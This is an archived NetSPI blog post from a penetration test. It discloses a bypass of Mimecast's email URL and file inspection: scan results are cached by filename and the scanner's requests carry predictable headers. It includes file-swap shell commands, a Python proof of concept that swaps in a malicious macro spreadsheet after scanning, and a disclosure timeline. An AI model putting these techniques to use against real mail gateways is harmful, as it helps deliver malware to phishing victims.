---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-10-20_bypassing-mimecast-url-and-file-inspection.md
original_filename: 2022-10-20_bypassing-mimecast-url-and-file-inspection.md
title: Bypassing Mimecast URL and File Inspection
category: documents
detected_topics:
- command-injection
- business-logic
- api-security
- cloud-security
- supply-chain
tags:
- imported
- documents
- command-injection
- business-logic
- api-security
- cloud-security
- supply-chain
language: en
raw_sha256: bd460313800f3ec92fed33339ee05892e59526c6a9a405f5238913a4cfe205d3
text_sha256: fca0e2b93b58e544ae96b237d432422495880ec3649f329354f30b6eeb2b99a7
ingested_at: '2026-06-28T07:32:15Z'
sensitivity: unknown
redactions_applied: false
---

# Bypassing Mimecast URL and File Inspection

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-10-20_bypassing-mimecast-url-and-file-inspection.md
- Source Type: markdown
- Detected Topics: command-injection, business-logic, api-security, cloud-security, supply-chain
- Ingested At: 2026-06-28T07:32:15Z
- Redactions Applied: False
- Raw SHA256: `bd460313800f3ec92fed33339ee05892e59526c6a9a405f5238913a4cfe205d3`
- Text SHA256: `fca0e2b93b58e544ae96b237d432422495880ec3649f329354f30b6eeb2b99a7`


## Content

---
title: "Bypassing Mimecast URL and File Inspection"
page_title: "Bypassing Mimecast URL and File Inspection | NetSPI"
url: "https://www.netspi.com/blog/technical/social-engineering/bypassing-mimecast-email-defenses/"
final_url: "https://www.netspi.com/blog/technical-blog/social-engineering/bypassing-mimecast-email-defenses/"
authors: ["Patrick Sayler (@psaYler)"]
programs: ["Mimecast"]
bugs: ["Secure Email Gateway bypass", "Logic flaw"]
publication_date: "2022-10-20"
added_date: "2022-10-28"
source: "pentester.land/writeups.json"
original_index: 2013
---

[Technical](/blog/technical-blog/#post-container) / Social Engineering 

# Bypassing Mimecast URL and File Inspection

October 20, 2022

### [Patrick Sayler](/authors/psayler/)

  * [](https://www.facebook.com/sharer/sharer.php?u=https://www.netspi.com/blog/technical-blog/social-engineering/bypassing-mimecast-email-defenses/)
  * [](https://twitter.com/intent/tweet?text=Bypassing Mimecast URL and File Inspection&url=https://www.netspi.com/blog/technical-blog/social-engineering/bypassing-mimecast-email-defenses/)
  * [](https://www.linkedin.com/shareArticle?mini=true&url=https://www.netspi.com/blog/technical-blog/social-engineering/bypassing-mimecast-email-defenses/&title=Bypassing Mimecast URL and File Inspection)

![Bypassing Mimecast URL and File Inspection](https://www.netspi.com/wp-content/uploads/2024/03/Blog-Feature-Images-02.webp)

Mimecast Targeted Threat Protection (TTP) is a suite of email security tools designed to protect end users from phishing attacks. The [**URL Protection**](https://www.mimecast.com/content/url-protection/) feature of this subscription can inspect links embedded in emails for malicious content. If a file is deemed safe, Mimecast will allow the user to retrieve it from the linked site. Files categorized as malicious are blocked and cannot be downloaded. 

Or so I thought.

### TL;DR 
  
  
  root@webserver:/var/www# ls 
  malware.xls	not-malware.xls
  
  root@webserver:/var/www# mv malware.xls not-malware.xls

During a hybrid [breach and attack simulation](https://www.netspi.com/security-testing/breach-and-attack-simulation/) and social engineering penetration test, I discovered a way to bypass Mimecast’s URL Protection and File Inspection features described above. 

Though, in the interest of transparency, I’m not sure I can claim that I  _discovered_ this issue. I would be surprised if this wasn’t already a known trick. Nevertheless, it was acknowledged by Mimecast and landed me a spot on their [Security Researcher Wall of Fame](https://www.mimecast.com/responsible-disclosure/). 

This is a great reminder of the importance of defense in depth strategies. In this instance, I was able to bypass, or evade, the email defense in place. When frontline security controls are bypassed, organizations must have back up, layered controls and policies in place to stop or slow down adversaries and prevent further incident escalation. 

I worked closely with Mimecast to responsibly disclose and remediate this issue. Let’s take a deeper look at the discovery and disclosure process. 

### Workflow

Here’s what happens behind the scenes when an email containing links is sent to an inbox protected by Mimecast. 

We will use 2 different files in these examples: 

  * happy.xls – A nearly-empty spreadsheet which only contains text 
  * sad.xls – An Excel file containing a basic malicious macro 

Each will be served by a basic web server powered by the [Python http.server module](https://docs.python.org/3/library/http.server.html). 

  1. The end-user receives an email containing links to retrieve your files. 

![Screenshot of email with links](https://www.netspi.com/wp-content/uploads/102022_Mimecast-Vulnerability_1.png)

  2. Clicking one of the links will result in the HTTP requests below. These are issued directly from**** Mimecast and are the “inspection” part of “URL Protection.” Take note of the timestamps and unique header values, as we’ll revisit these later. 

![Web server logs showing that TTP retrieved the file](https://www.netspi.com/wp-content/uploads/102022_Mimecast-Vulnerability_2.png)

#### Request 1 (Mimecast) 
  
  
  GET /happy.xls HTTP/1.1 
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
  Sec-Fetch-Site: none
  Sec-Fetch-Mode: navigate
  Sec-Fetch-User: ?1
  Sec-Fetch-Dest: document
  sec-ch-ua: " Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"
  sec-ch-ua-mobile: ?0
  sec-ch-ua-platform: "Windows"
  Accept-Encoding: gzip, deflate, br
  Accept-Language: en-US,en;q=0.9
  Host: january132022.com
  Cache-Control: max-age=259200
  Connection: keep-alive

#### Request 2 (Mimecast)
  
  
  GET /happy.xls HTTP/1.1 
  User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36
  Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
  Accept-Encoding: gzip,deflate
  Accept-Language: en-gb,en;q=0.5
  x-client-ip: 163.172.240.97
  x-real-ip: 163.172.240.97
  x-client: 163.172.240.97
  Host: january132022.com
  Cache-Control: max-age=259200
  Connection: close

  3. If the file is deemed safe, Mimecast will present the Download button. Clicking this will result in a final request to finally retrieve the file. This request will be issued from**your** client, ** _not from Mimecast_**. 

![TTP classification](https://www.netspi.com/wp-content/uploads/102022_Mimecast-Vulnerability_3.png)

#### Request 3 (End User)
  
  
  GET /happy.xls HTTP/1.1
  Host: january132022.com
  Connection: keep-alive
  Cache-Control: max-age=0
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
  Accept-Encoding: gzip, deflate
  Accept-Language: en-US,en;q=0.9

  4. However, if the file contents are found to be malicious, Mimecast Targeted Threat Protection will classify the file as harmful and prevent the user from accessing it. 

![Web server logs showing that TTP retrieved the second file](https://www.netspi.com/wp-content/uploads/102022_Mimecast-Vulnerability_4.png) ![TTP classification](https://www.netspi.com/wp-content/uploads/102022_Mimecast-Vulnerability_5.png)

### The Problems 

Did anything in that process catch your eye? There are four core concerns I had with this process. Mimecast’s corresponding remediation steps for each of these problems can be found at the end of this article. 

#### 1\. File content is not served by Mimecast

After clicking the Download button, the end user will retrieve the file **directly from the remote link**.

#### 2\. A Predictable Pattern

HTTP requests generated by Mimecast file inspection follow a predictable pattern. In the workflow above, Requests 1 and 2 will always be issued in that exact order, in the same two-second interval, and with the shown header values.

This means that an attacker can accurately determine when a file has been inspected by TTP. By monitoring for the unique header values in Request 2 (i.e., `x-client-ip, x-real-ip, x-client`), the attacker can modify the subsequent response to Request 3 to return an entirely different set of file contents. This would allow an attacker to present a clean file to Mimecast, while serving malicious content to the end user.

These two items alone could compromise the integrity of inspection results. Though there’s a much simpler way to achieve the same result.

#### 3\. Results are Stored by Filename

That’s right! URLs are only inspected during their first visit by that user. If a URL is previously designated as safe, the content and classification will remain cached for a length of time. An attacker can bypass protections by **simply renaming a malicious file** to match the filename of a previously categorized safe file. This result remained for up to four hours in my testing; however, Mimecast has shared with me that they will look to address this via risk-based caching.

#### 4\. Results are Shared

While you can’t see it in the above screenshots, I found that links rewritten by TTP do not appear to be completely unique. Inspections, and their resulting categories, are seemingly persistent across identical messages sent from two different source addresses. An attacker could send a benign message to the target from Address A, then re-send the same message from Address B after the file has been categorized.

### The Problems Combined

Let’s put everything together. To demonstrate the attack workflow, the examples below will pick up immediately after I attempted to click the Blocked file. 

  1. On the remote web server, rename the malicious file to match the filename of the safe file. Review the checksum to confirm that the file matches. 

  
  
  # sha256sum happy.xls  
  87762ea8f248335b92bbadf71396305d2090537401d51d6a55df6754e74c2e25  happy.xls 
  
  # sha256sum sad.xls 
  131f2276d2003b22d51a8817817edd5ab2dcbb9b0b487f5149717e034d2b67e7  sad.xls 
  
  # cp happy.xls backup_happy.xls 
  
  # cp sad.xls happy.xls 
  
  # sha256sum sad.xls 
  131f2276d2003b22d51a8817817edd5ab2dcbb9b0b487f5149717e034d2b67e7  sad.xls 
  
  # sha256sum happy.xls 
  131f2276d2003b22d51a8817817edd5ab2dcbb9b0b487f5149717e034d2b67e7  happy.xls 
  
  # ls
  backup_happy.xls  happy.xls  nocachebasicweb.py  sad.xls

**_Renaming the malicious file to replace the safe file_**

  2. Return to the email and click the link to the safe file, which now hosts the contents of the malicious file. Review the web server logs and observe that Mimecast does not attempt to inspect the file a second time, resulting in the malicious file being classified as safe. Downloading and reviewing the file confirm that the malicious content was successfully downloaded. 

![TTP incorrect classification](https://www.netspi.com/wp-content/uploads/102022_Mimecast-Vulnerability_6.png) ![Web server logs showing that TTP did not inspect the file, and that it can be downloaded](https://www.netspi.com/wp-content/uploads/102022_Mimecast-Vulnerability_7.png)

### TTPs against TTP

While you can certainly follow the “steps” outlined in the TL;DR, I think we can make this better. 

#### Proof-of-Concept 1: Automatic File Renaming

The Python script below will start a web server on the host and automatically rename a malicious file to an inspected, safe filename. Note that the below code is a basic example and will only function a single time. It is not clean, but it certainly does the job. 

**Code:**
  
  
  # NoCacheHTTPServer.py
  # Made from https://stackoverflow.com/questions/42341039/remove-cache-in-a-python-http-server
  import os
  import http.server 
  
  PORT = 80
  count = 1 
  
  class NoCacheHTTPRequestHandler( 
  http.server.SimpleHTTPRequestHandler 
  ): 
  def send_response_only(self, code, message=None): 
  resp = super().send_response_only(code, message) 
  self.send_header('Cache-Control', 'no-store, must-revalidate') 
  self.send_header('Expires', '0') 
  
  global count 
  count = count + 1 
  
  if count == 2: 
  print('[*] MIMECAST SCAN 1') 
  
  elif count == 3: 
  print('[*] MIMECAST SCAN 2') 
  print('[**] MIMECAST SCAN COMPLETE. REPLACING FILE.') 
  os.rename('thisfileissafe.xls', 'thisfileissafe.xls.bak') 
  os.rename('virus.xls', 'thisfileissafe.xls') 
  
  if __name__ == '__main__': 
  http.server.test( 
  HandlerClass=NoCacheHTTPRequestHandler, 
  port=PORT 
  )

#### Proof-of-Concept 2: Automatic TTP Evasion

This one will start a web server on the host and serve safe content by default. It reviews each incoming request for the unique HTTP request headers provided by Mimecast URL Protection (x-client, x-client-ip, and x-real-ip). If these headers are detected, it will then automatically alter the response to the subsequent request and serve malicious content, then reset to safe content afterwards. 

This process will repeat each time the TTP headers are detected. This allows the attacker to evade future detections while continuing to deliver malicious content to additional victims. And just for good measure, the victim IP can be hardcoded to always serve the payload when they visit. 

The code below can be found on [GitHub](https://github.com/psayler). 

**Code:** <https://github.com/psayler/MrMimecast>

**Example:**

### Lingering Questions

This was discovered during an active engagement, so I was not in a position to review every single edge case. These are questions that I asked myself but were unable to answer. 

  * Are rewritten URLs shared across email accounts within the organization? 
  * Ex: attacker@example.com sends an email to alice@netspi.com and  
bob@netspi.com. If Bob clicks the link and causes the URL to be categorized, will that category carry over to Alice’s link as well? 
  * Are rewritten URLs shared across accounts in separate Mimecast tenants? 
  * Ex: attacker@example.com sends an email to patrick@netspi.com and  
steve@competitor.com. If Patrick clicks the link and causes the URL to be categorized, will that carry over to Steve’s link as well? 
  * If results are shared, an attacker could potentially pre-inspect and categorize files by sending messages to their own Mimecast subscription. 
  * How long is the scan result cached? My estimates were around 4 hours. This makes attacks somewhat time-sensitive, but still leaves a large window of opportunity. 

### Recommendation to Mimecast

Users should be unable to retrieve an inspected file directly from the remote host. Instead, TTP should act as an intermediary and temporarily store a copy of the inspected file to serve to the user. This would address all of the demonstrated evasion methods. Future download attempts by the user should be served from TTP – either the previously cached version or a newly inspected copy. 

### Disclosure, Feedback, and Timeline 

Mimecast has indicated that they will be implementing these suggestions and provided the following comments: 

  1. File content is not served by Mimecast  
_Mimecast has committed to implementing a fix._
  2. A Predictable Pattern  
_This issue has been addressed._
  3. Results are Stored by Filename  
_Addressed via risk-based caching on a continuous basis._
  4. Results are Shared  
_Addressed via risk-based caching on a continuous basis._

Unfortunately, without an active Mimecast subscription, I have no way to confirm if this is accurate. 

Below is a timeline of the disclosure process: 

  * 1/23/2022 
  * Initial disclosure document sent to [disclosure@mimecast.com](mailto:disclosure@mimecast.com)
  * 1/23/2022 – 1/31/2022 
  * Revisiting the issue during an active engagement and notice that the “x-client” headers were no longer present 
  * Follow-up message sent to Mimecast to confirm if any changes have already been made 
  * 2/4/2022 
  * Mimecast acknowledges the initial disclosure 
  * 3/7/2022 
  * Mimecast confirms they can reproduce the issue 
  * Mimecast states that their engineers are working on a fix, based on the provided remediation guidance 
  * 3/8/2022 – 3/18/2022 
  * Added to acknowledgements page (<https://www.mimecast.com/responsible-disclosure/>) 
  * 5/11/2022 
  * Mimecast indicates that the fix is intended to be implemented by the end of August 2022 
  * 8/30/2022 
  * Mimecast confirms August 2022 remediation timeline 
  * 9/1/2022 
  * Draft blog post shared with Mimecast for review 
  * 9/16/2022 – 10/18/2022 
  * Blog post feedback received from Mimecast 
  * Content amended to include the above 

## Explore More Blog Posts

[ ![](https://www.netspi.com/wp-content/uploads/2024/07/072924_TECH_GCPwn_Feature.webp) Cloud Pentesting Bypassing Microsoft Entra Conditional Access Policies via Nested App Authentication  June 22, 2026 Discover how attackers bypassed Microsoft Entra Conditional Access Policies using Nested App Authentication (NAA) flows in this technical vulnerability breakdown. Learn More ](https://www.netspi.com/blog/technical-blog/cloud-pentesting/bypassing-microsoft-entra-conditional-access-policies-via-nested-app-authentication/)[ ![](https://www.netspi.com/wp-content/uploads/2026/06/Feature-Image_Red-Plaid.jpg) Social Engineering I’m Just Asking Questions: Social Engineering as a Reporter  June 17, 2026 Dive into this real-world social engineering assessment where a fake anonymous tip and an adversary-in-the-middle framework tested the limits of an organization's security policies. Learn More ](https://www.netspi.com/blog/technical-blog/social-engineering/im-just-asking-questions-social-engineering-as-a-reporter/)[ ![](https://www.netspi.com/wp-content/uploads/2025/12/TB-Design-6_Feature-Image.png) CISO Perspectives Beyond the Hype: What Regulated Industries Need to Know Before Trusting AI Security Tooling  June 16, 2026 AI security tools can build an attack, but enterprise security teams in regulated industries need consistency, auditability, and predictable costs before they can trust one. Learn why the surrounding infrastructure is where most AI security vendors are still falling short. Learn More ](https://www.netspi.com/blog/executive-blog/ciso-perspectives/beyond-the-hype-what-regulated-industries-need-to-know-before-trusting-ai-security-tooling/)
